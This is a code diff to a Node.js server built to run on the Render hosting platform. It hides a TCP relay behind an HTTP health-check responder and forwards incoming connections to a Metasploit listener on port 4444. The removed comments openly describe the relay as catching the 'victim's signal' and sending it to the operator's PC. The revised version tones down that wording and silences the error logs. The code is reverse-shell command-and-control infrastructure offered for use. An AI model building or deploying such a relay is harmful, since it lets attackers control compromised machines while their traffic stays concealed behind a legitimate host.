@@ -1,30 +1,33 @@
 const net = require('net');
 const http = require('http');
 
-// Render uses this dynamic port to keep your service live
+// Render uses this PORT to keep the service alive
 const PORT = process.env.PORT || 10000;
 
-// 1. HTTP Server: To satisfy Render's health check and avoid 502 errors
-const httpServer = http.createServer((req, res) => {
+// This server performs a dual role to satisfy Render's health check
+const server = http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('Server is running properly\n');
 });
 
-// 2. TCP Proxy: This captures the victim's signal and sends it to your PC
-const tcpServer = net.createServer((socket) => {
-    console.log('Victim signal received!');
-    // Forwarding to your local Metasploit on port 4444
+// Proxy logic to forward data to your Metasploit
+const proxy = net.createServer((socket) => {
+    console.log('Connection detected!');
     const client = net.createConnection({ port: 4444, host: '127.0.0.1' });
     
     socket.pipe(client);
     client.pipe(socket);
     
-    socket.on('error', (e) => console.log('Socket Error:', e.message));
-    client.on('error', (e) => console.log('Client Error:', e.message));
+    socket.on('error', () => {});
+    client.on('error', () => {});
 });
 
-// IMPORTANT: We listen on the Render-provided port (PORT)
-// Render maps this port to public port 443 automatically
-tcpServer.listen(PORT, '0.0.0.0', () => {
-    console.log(`Proxy server is live and stable on port ${PORT}`);
+// Start listening only on the Render-provided port
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`HTTP/TCP Proxy is live on port ${PORT}`);
+});
+
+// Attach proxy to the same server context
+server.on('upgrade', (req, socket, head) => {
+    proxy.emit('connection', socket);
 });
